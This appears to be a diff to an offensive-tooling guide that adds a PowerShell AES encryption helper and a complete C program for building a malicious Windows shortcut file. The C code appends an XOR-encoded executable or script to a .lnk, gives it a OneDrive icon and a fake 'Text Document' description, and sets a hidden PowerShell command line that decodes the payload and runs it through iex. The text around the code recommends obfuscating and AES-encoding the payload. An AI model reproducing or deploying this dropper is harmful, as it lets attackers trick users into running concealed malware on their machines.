@@ -322,3 +322,489 @@ I said that before, If you want, you can obfuscate this code, then put it the bo
 
 I recommend that you should encode it with AES..
 
+```powershell
+<#
+.SYNOPSIS
+Encryptes or Decrypts Strings or Byte-Arrays with AES
+ 
+.DESCRIPTION
+Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)
+ 
+.PARAMETER Mode
+Encryption or Decryption Mode
+ 
+.PARAMETER Key
+Key used to encrypt or decrypt
+ 
+.PARAMETER Text
+String value to encrypt or decrypt
+ 
+.PARAMETER Path
+Filepath for file to encrypt or decrypt
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
+ 
+Description
+-----------
+Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
+ 
+Description
+-----------
+Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
+ 
+Description
+-----------
+Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
+ 
+Description
+-----------
+Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
+#>
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".aes"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+```
+
+```c
+#define _CRT_SECURE_NO_WARNINGS
+#include <stdio.h>
+#include <windows.h>
+
+#define INVALID_SET_FILE_POINTER 0xFFFFFFFF
+
+#define HasName 0x00000004
+#define HasArguments 0x00000020
+#define HasIconLocation 0x00000040
+#define IsUnicode 0x00000080
+#define HasExpString 0x00000200
+#define PreferEnvironmentPath 0x02000000
+
+struct ShellLinkHeaderStruct
+{
+	DWORD dwHeaderSize;
+	CLSID LinkCLSID;
+	DWORD dwLinkFlags;
+	DWORD dwFileAttributes;
+	FILETIME CreationTime;
+	FILETIME AccessTime;
+	FILETIME WriteTime;
+	DWORD dwFileSize;
+	DWORD dwIconIndex;
+	DWORD dwShowCommand;
+	WORD wHotKey;
+	WORD wReserved1;
+	DWORD dwReserved2;
+	DWORD dwReserved3;
+};
+
+struct EnvironmentVariableDataBlockStruct
+{
+	DWORD dwBlockSize;
+	DWORD dwBlockSignature;
+	char szTargetAnsi[MAX_PATH];
+	wchar_t wszTargetUnicode[MAX_PATH];
+};
+
+DWORD CreateLinkFile(char* pExePath, char* pOutputLinkPath, char* pLinkIconPath, char* pLinkDescription)
+{
+	HANDLE hLinkFile = NULL;
+	HANDLE hExeFile = NULL;
+	struct ShellLinkHeaderStruct ShellLinkHeader;
+	struct EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock;
+	DWORD dwBytesWritten = 0;
+	WORD wLinkDescriptionLength = 0;
+	wchar_t wszLinkDescription[512];
+	WORD wCommandLineArgumentsLength = 0;
+	wchar_t wszCommandLineArguments[8192];
+	WORD wIconLocationLength = 0;
+	wchar_t wszIconLocation[512];
+	BYTE bExeDataBuffer[1024];
+	DWORD dwBytesRead = 0;
+	DWORD dwEndOfLinkPosition = 0;
+	DWORD dwCommandLineArgsStartPosition = 0;
+	wchar_t* pCmdLinePtr = NULL;
+	wchar_t wszOverwriteSkipBytesValue[16];
+	wchar_t wszOverwriteSearchLnkFileSizeValue[16];
+	BYTE bXorEncryptValue = 0;
+	DWORD dwTotalFileSize = 0;
+
+	// set xor encrypt value
+	bXorEncryptValue = 0x77;
+
+	// create link file
+	hLinkFile = CreateFileA(pOutputLinkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hLinkFile == INVALID_HANDLE_VALUE)
+	{
+		printf("Failed to create output file\n");
+		return 1;
+	}
+
+	// initialise link header
+	memset((void*)&ShellLinkHeader, 0, sizeof(ShellLinkHeader));
+	ShellLinkHeader.dwHeaderSize = sizeof(ShellLinkHeader);
+	CLSIDFromString(L"{00021401-0000-0000-C000-000000000046}", &ShellLinkHeader.LinkCLSID);
+	ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation;
+	ShellLinkHeader.dwFileAttributes = 0;
+	ShellLinkHeader.CreationTime.dwHighDateTime = 0;
+	ShellLinkHeader.CreationTime.dwLowDateTime = 0;
+	ShellLinkHeader.AccessTime.dwHighDateTime = 0;
+	ShellLinkHeader.AccessTime.dwLowDateTime = 0;
+	ShellLinkHeader.WriteTime.dwHighDateTime = 0;
+	ShellLinkHeader.WriteTime.dwLowDateTime = 0;
+	ShellLinkHeader.dwFileSize = 0;
+	ShellLinkHeader.dwIconIndex = 0;
+	ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE;
+	ShellLinkHeader.wHotKey = 0;
+
+	// write ShellLinkHeader
+	if (WriteFile(hLinkFile, (void*)&ShellLinkHeader, sizeof(ShellLinkHeader), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// set link description
+	memset(wszLinkDescription, 0, sizeof(wszLinkDescription));
+	mbstowcs(wszLinkDescription, pLinkDescription, (sizeof(wszLinkDescription) / sizeof(wchar_t)) - 1);
+	wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription);
+
+	// write LinkDescriptionLength
+	if (WriteFile(hLinkFile, (void*)&wLinkDescriptionLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// write LinkDescription
+	if (WriteFile(hLinkFile, (void*)wszLinkDescription, wLinkDescriptionLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// set target command-line
+	memset(wszCommandLineArguments, 0, sizeof(wszCommandLineArguments));
+	//_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $path = '%%temp%%\\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file ^| select -Skip 000000)) -Encoding Byte; ^& $path;", "", bXorEncryptValue);
+	_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $c=([byte[]]($file ^| select -Skip 000000));[System.Text.Encoding]::UTF8.GetString($c) ^| iex", "", bXorEncryptValue);
+	wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments);
+
+	// write CommandLineArgumentsLength
+	if (WriteFile(hLinkFile, (void*)&wCommandLineArgumentsLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// store start of command-line arguments position
+	dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, NULL);
+
+	// write CommandLineArguments
+	if (WriteFile(hLinkFile, (void*)wszCommandLineArguments, wCommandLineArgumentsLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// set link icon path
+	memset(wszIconLocation, 0, sizeof(wszIconLocation));
+	mbstowcs(wszIconLocation, pLinkIconPath, (sizeof(wszIconLocation) / sizeof(wchar_t)) - 1);
+	wIconLocationLength = (WORD)wcslen(wszIconLocation);
+
+	// write IconLocationLength
+	if (WriteFile(hLinkFile, (void*)&wIconLocationLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// write IconLocation
+	if (WriteFile(hLinkFile, (void*)wszIconLocation, wIconLocationLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// initialise environment variable data block
+	memset((void*)&EnvironmentVariableDataBlock, 0, sizeof(EnvironmentVariableDataBlock));
+	EnvironmentVariableDataBlock.dwBlockSize = sizeof(EnvironmentVariableDataBlock);
+	EnvironmentVariableDataBlock.dwBlockSignature = 0xA0000001;
+	strncpy(EnvironmentVariableDataBlock.szTargetAnsi, "%windir%\\system32\\cmd.exe", sizeof(EnvironmentVariableDataBlock.szTargetAnsi) - 1);
+	mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (sizeof(EnvironmentVariableDataBlock.wszTargetUnicode) / sizeof(wchar_t)) - 1);
+
+	// write EnvironmentVariableDataBlock
+	if (WriteFile(hLinkFile, (void*)&EnvironmentVariableDataBlock, sizeof(EnvironmentVariableDataBlock), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// store end of link data position
+	dwEndOfLinkPosition = GetFileSize(hLinkFile, NULL);
+
+	// open target exe file
+	hExeFile = CreateFileA(pExePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hExeFile == INVALID_HANDLE_VALUE)
+	{
+		printf("Failed to open exe file\n");
+
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// append exe file to the end of the lnk file
+	for (;;)
+	{
+		// read data from exe file
+		if (ReadFile(hExeFile, bExeDataBuffer, sizeof(bExeDataBuffer), &dwBytesRead, NULL) == 0)
+		{
+			// error
+			CloseHandle(hExeFile);
+			CloseHandle(hLinkFile);
+
+			return 1;
+		}
+
+		// check for end of file
+		if (dwBytesRead == 0)
+		{
+			break;
+		}
+
+		// "encrypt" the exe file data
+		for (DWORD i = 0; i < dwBytesRead; i++)
+		{
+			bExeDataBuffer[i] ^= bXorEncryptValue;
+		}
+
+		// write data to lnk file
+		if (WriteFile(hLinkFile, bExeDataBuffer, dwBytesRead, &dwBytesWritten, NULL) == 0)
+		{
+			// error
+			CloseHandle(hExeFile);
+			CloseHandle(hLinkFile);
+
+			return 1;
+		}
+	}
+
+	// close exe file handle
+	CloseHandle(hExeFile);
+
+	// store total file size
+	dwTotalFileSize = GetFileSize(hLinkFile, NULL);
+
+	// find the offset value of the number of bytes to skip in the command-line arguments
+	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"select -Skip 000000)");
+	if (pCmdLinePtr == NULL)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+	pCmdLinePtr += strlen("select -Skip ");
+
+	// move the file pointer back to the "000000" value in the command-line arguments
+	if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// overwrite link file size
+	memset(wszOverwriteSkipBytesValue, 0, sizeof(wszOverwriteSkipBytesValue));
+	_snwprintf(wszOverwriteSkipBytesValue, (sizeof(wszOverwriteSkipBytesValue) / sizeof(wchar_t)) - 1, L"%06u", dwEndOfLinkPosition);
+	if (WriteFile(hLinkFile, (void*)wszOverwriteSkipBytesValue, wcslen(wszOverwriteSkipBytesValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// find the offset value of the total lnk file length in the command-line arguments
+	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"_.length -eq 0x00000000}");
+	if (pCmdLinePtr == NULL)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+	pCmdLinePtr += strlen("_.length -eq ");
+
+	// move the file pointer back to the "0x00000000" value in the command-line arguments
+	if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// overwrite link file size
+	memset(wszOverwriteSearchLnkFileSizeValue, 0, sizeof(wszOverwriteSearchLnkFileSizeValue));
+	_snwprintf(wszOverwriteSearchLnkFileSizeValue, (sizeof(wszOverwriteSearchLnkFileSizeValue) / sizeof(wchar_t)) - 1, L"0x%08X", dwTotalFileSize);
+	if (WriteFile(hLinkFile, (void*)wszOverwriteSearchLnkFileSizeValue, wcslen(wszOverwriteSearchLnkFileSizeValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
+	{
+		// error
+		CloseHandle(hLinkFile);
+
+		return 1;
+	}
+
+	// close output file handle
+	CloseHandle(hLinkFile);
+
+	return 0;
+}
+
+int main(int argc, char* argv[])
+{
+	char* pExePath = NULL;
+	char* pOutputLinkPath = NULL;
+
+	if (argc != 3)
+	{
+		printf("Usage: %s [exe_path] [output_lnk_path]\n\n", argv[0]);
+
+		return 1;
+	}
+
+	// get params
+	pExePath = argv[1];
+	pOutputLinkPath = argv[2];
+
+	// create a link file containing the target exe
+	if (CreateLinkFile(pExePath, pOutputLinkPath, "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", "Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23") != 0)
+	{
+		printf("Error\n");
+
+		return 1;
+	}
+
+	printf("Finished\n");
+
+	return 0;
+}
+```
